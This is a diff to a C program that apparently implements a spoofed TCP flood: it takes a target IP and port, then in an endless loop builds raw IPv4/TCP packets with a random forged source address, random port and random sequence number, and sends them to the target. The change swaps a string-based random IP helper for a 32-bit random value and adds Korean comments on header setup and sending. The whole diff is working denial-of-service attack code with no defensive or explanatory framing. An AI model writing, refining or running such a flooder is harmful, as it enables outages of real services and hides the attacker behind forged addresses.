@@ -56,23 +56,6 @@ unsigned int get_random_uint() {
     return r;
 }
 
-char *random_ip() {
-    static char ip[16];
-    unsigned char bytes[4];
-    int fd = open("/dev/urandom", O_RDONLY);
-    if (fd < 0) {
-        perror("open");
-        exit(1);
-    }
-    if (read(fd, bytes, 4) != 4) {
-        perror("read");
-        exit(1);
-    }
-    close(fd);
-    snprintf(ip, sizeof(ip), "%d.%d.%d.%d", bytes[0], bytes[1], bytes[2], bytes[3]);
-    return ip;
-}
-
 int main(int argc, char *argv[]) {
     if (argc != 3) {
         printf("Usage: %s <target_ip> <target_port>\n", argv[0]);
@@ -110,9 +93,10 @@ int main(int argc, char *argv[]) {
     while (running) {
         memset(datagram, 0, 4096);
 
-        char *source_ip = random_ip();
+        // 매 패킷마다 무작위 소스 IP 생성 (32비트 정수형)
+        uint32_t source_ip = get_random_uint();
 
-        // IP header
+        // IP 헤더 설정
         iph->ihl = 5;
         iph->version = 4;
         iph->tos = 0;
@@ -122,11 +106,11 @@ int main(int argc, char *argv[]) {
         iph->ttl = 64;
         iph->protocol = IPPROTO_TCP;
         iph->check = 0;
-        iph->saddr = inet_addr(source_ip);
+        iph->saddr = source_ip;
         iph->daddr = sin.sin_addr.s_addr;
         iph->check = checksum((unsigned short *) datagram, iph->tot_len);
 
-        // TCP header
+        // TCP 헤더 설정
         tcph->source = htons(get_random_uint() % 65535);
         tcph->dest = htons(target_port);
         tcph->seq = htonl(get_random_uint());
@@ -136,6 +120,7 @@ int main(int argc, char *argv[]) {
         tcph->window = htons(1024);
         tcph->check = 0;
 
+        // Pseudo header
         struct pseudo_header {
             u_int32_t source_address;
             u_int32_t dest_address;
@@ -145,7 +130,7 @@ int main(int argc, char *argv[]) {
         };
 
         struct pseudo_header psh;
-        psh.source_address = inet_addr(source_ip);
+        psh.source_address = source_ip;
         psh.dest_address = sin.sin_addr.s_addr;
         psh.placeholder = 0;
         psh.protocol = IPPROTO_TCP;
@@ -156,6 +141,7 @@ int main(int argc, char *argv[]) {
         memcpy(pseudo_packet + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
         tcph->check = checksum((unsigned short*)pseudo_packet, sizeof(pseudo_packet));
 
+        // 패킷 전송
         if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
             perror("sendto failed");
         } else {
